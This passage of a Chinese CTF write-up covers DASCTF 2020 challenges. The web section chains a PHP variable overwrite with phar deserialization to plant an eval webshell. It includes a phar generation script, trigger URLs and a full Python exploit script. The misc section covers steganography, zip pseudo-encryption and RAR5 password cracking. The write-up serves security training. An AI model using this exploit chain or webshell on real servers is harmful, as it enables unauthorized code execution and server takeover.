<span class="token punctuation">&#123;</span>    <span class="token variable">$tp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$tp</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"No! You only have 3 template to reader"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">[</span><span class="token variable">$tp</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Please choice one template to reader"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>关键点<code>exract</code>，可见变量覆盖<code>template</code>再利用<code>tp</code>达到任意文件读取。不过不可能直接读flag的，先读了<code>template.php</code></p><p><code>./?var[template][1]=template.php&amp;tp=1</code></p><pre class="language-php" data-language="php"><code class="language-php">//template.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".html"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean constant">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your html file is in "</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>注意到关键点有个全局变量，联想到之前的变量覆盖，这里肯定是可以利用的。</p><p>类<code>Template</code>大概意思就是传入的<code>content</code>，利用<code>pattern</code>进行正则匹配，利用全局变量中的值替换匹配到的值，最后输出以<code>suffix</code>后缀的文件。</p><p>摸索一番后确认为神奇的phar反序列化，考点为文件上传和命令执行。</p><p>利用脚本生成phar文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&#123;&#123;gyycoming&#125;&#125;"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".php"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean constant">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your html file is in "</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.txt'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>可以看到<code>content</code>为<code>gyycoming</code>，之后变量覆盖<code>gyycoming</code>为一句话木马，生成.php文件，即可成功getshell</p><p>还有更好的方法，直接<code>content</code>为一句话木马，<code>pattern</code>直接删掉，既然可以phar反序列化，就有很多姿势了。</p><p>首先用<code>php://input</code>伪协议上传phar文件。</p><p><code>./tp=1&amp;var[template][1]=php://input</code>，POST上传phar</p><p>然后触发phar文件，利用<code>phar://</code>伪协议</p><p><code>./?var[template][1]=phar://&quot;+&lt;url_path&gt;+&quot;&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?&gt;</code></p><img src="/article/dasctf2020/image-20201228193214814.png" class="" title="image-20201228193214814" loading="lazy"><p>可以看到第一个是正常的文件，第二个是触发phar反序列化写入的.php文件，蚁剑连上，到根目录执行<code>/readflag</code>即可。</p><img src="/article/dasctf2020/image-20201228193429000.png" class="" title="image-20201228193429000" loading="lazy"><p>所以直接读是不可以的，<code>400</code>没有权限，需要执行<code>/readflag</code>。</p><p>最后附上exp</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/25 14:24@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> osbaseurl <span class="token operator">=</span> <span class="token string">"http://8.129.41.25:10305/"</span><span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    php <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?phpclass Template&#123;    public $content;    public $pattern;    public $suffix;    public function __construct()&#123;        $this->content = "&#123;&#123;gyycoming&#125;&#125;";        $this->pattern = "/&#123;&#123;([a-z]+)&#125;&#125;/";        $this->suffix = ".php";    &#125;    public function __destruct() &#123;        $this->render();    &#125;    public function render() &#123;        while (True) &#123;            if(preg_match($this->pattern, $this->content, $matches)!==1)                break;            global $&#123;$matches[1]&#125;;            if(isset($&#123;$matches[1]&#125;)) &#123;                $this->content = preg_replace($this->pattern, $&#123;$matches[1]&#125;, $this->content);            &#125;            else&#123;                break;            &#125;        &#125;        if(strlen($this->suffix)>5) &#123;            echo "error suffix";            die();        &#125;        $filename = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']) . "/" . md5($this->content) . $this->suffix;        file_put_contents($filename, $this->content);        echo "Your html file is in " . $filename;    &#125;&#125;$phar = new Phar('phar.phar');$phar -> stopBuffering();$phar -> setStub('&lt;?php __HALT_COMPILER();?>');$phar -> addFromString('test.txt','test');$object = new Template();$phar -> setMetadata($object);$phar -> stopBuffering();?>'''</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar.php'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>php<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.php is create'</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'php phar.php'</span><span class="token punctuation">)</span>    a<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.phar is create'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] create phar file wrong."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">up_phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?tp=1&amp;var[template][1]=php://input"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        pharfile <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pharfile<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file to ----> "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"/var/www/html/"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        upurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token builtin">str</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] upload pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phar_trigger</span><span class="token punctuation">(</span>upurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?var[template][1]=phar://"</span><span class="token operator">+</span>upurl<span class="token operator">+</span><span class="token string">"&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?>"</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shell file ----> "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".php"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        shellurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> shellurl    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] trigger pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"gyy"</span> <span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"system('/readflag');"</span>    phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    upurl <span class="token operator">=</span> up_phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shellurl <span class="token operator">=</span> phar_trigger<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shell<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre><hr><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><hr><h4 id="马老师的秘籍"><a href="#马老师的秘籍" class="headerlink" title="马老师的秘籍"></a>马老师的秘籍</h4><p>签到题</p><img src="/article/dasctf2020/image-20201228193732975.png" class="" title="image-20201228193732975" loading="lazy"><p>首先拿到一张图片，随便扫了一个，竟然是招式名称…不过既然是题目，图片肯定不止是图片…用十六进制查看，底部发现了zip标志头<code>50 4D 03 04</code></p><img src="/article/dasctf2020/image-20201228193923701.png" class="" title="image-20201228193923701" loading="lazy"><p>用foremost提前或者直接拖到最后新建十六进制文件搞出来，是个压缩包</p><img src="/article/dasctf2020/image-20201228194027067.png" class="" title="image-20201228194027067" loading="lazy"><p>有加密，所以检查一下，发现有伪加密，直接修改加密位拖出来jpg文件，其他两个是真加密</p><img src="/article/dasctf2020/image-20201228194144848.png" class="" title="image-20201228194144848" loading="lazy"><p>图片很花，不过依稀能看出来东西的</p><img src="/article/dasctf2020/image-20201228194307542.png" class="" title="image-20201228194307542" loading="lazy"><p>所以利用Stegsolve，把这张和原图异或一下即可</p><img src="/article/dasctf2020/image-20201228194456072.png" class="" title="image-20201228194456072" loading="lazy"><p><code>md5(NianQingRenBuJiangWuDe)</code></p><p>那这串去解密真加密文件<code>c57988283c92f759585a0c1aebfdd743</code>，密码正确。</p><p>这里有人说明文攻击也行…没跑过，大概可以吧。</p><p>文本文件里一堆<code>左正蹬 右鞭腿 左刺拳</code>，第二个里面</p><pre class="language-none"><code class="language-none">左正蹬 -&gt; .右鞭腿 -&gt; !左刺拳 -&gt; ?</code></pre><p>很显然，替换。替换完后只有<code>.!?</code>，推测为Ook!加密，直接去解，得到flag</p><img src="/article/dasctf2020/image-20201228195508111.png" class="" title="image-20201228195508111" loading="lazy"><hr><h4 id="FakePic"><a href="#FakePic" class="headerlink" title="FakePic"></a>FakePic</h4><p>RAR压缩包注释提示密码为1???小写字母，共四位</p><img src="/article/dasctf2020/image-20201228195736671.png" class="" title="image-20201228195736671" loading="lazy"><p>输出个字典用ARPA准备跑，结果提示这不是个RAR文件，则为RAR5格式，利用hashcat破解，得到密码<code>1cpp</code></p><p>解压后一个图片一个提示</p><pre class="language-none"><code class="language-none">10132430取最前面500位就行</code></pre><p>Stegsolve分析一波无果，提示也一头雾水。最后在十六进制查看在文件末尾时发现提示</p><img src="/article/dasctf2020/image-20201228195943508.png" class="" title="image-20201228195943508" loading="lazy"><p>分析到这没做了，电脑有问题没装上PIL模块。</p><p>赛后参考<a href="https://l1near.top/index.php/2020/12/27/87.html">大师傅博客</a>，利用脚本跑出Alpha通道前几个点，发现</p><img src="/article/dasctf2020/image-20201228203355447.png" class="" title="image-20201228203355447" loading="lazy"><p> 都是2的倍数，且倍数都不大。结合前面的提示（而且提示的长度还为8）。那么就猜测提示的作用是这样的：<code>10132430</code>得这样分<code>1 0 1 3 2 4 3 0</code>，然后这8个为一轮一直循环。如果刚好轮到这个数，算出来的<code>pow(2,x)</code>和Alpha通道的值一样，那么就为1，否则就为0。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagepic <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>width<span class="token punctuation">,</span>height <span class="token operator">=</span> pic<span class="token punctuation">.</span>sizeflag <span class="token operator">=</span> <span class="token string">""</span>z <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>i <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> z <span class="token operator">&lt;=</span> <span class="token number">500</span><span class="token punctuation">:</span>            z <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span>z 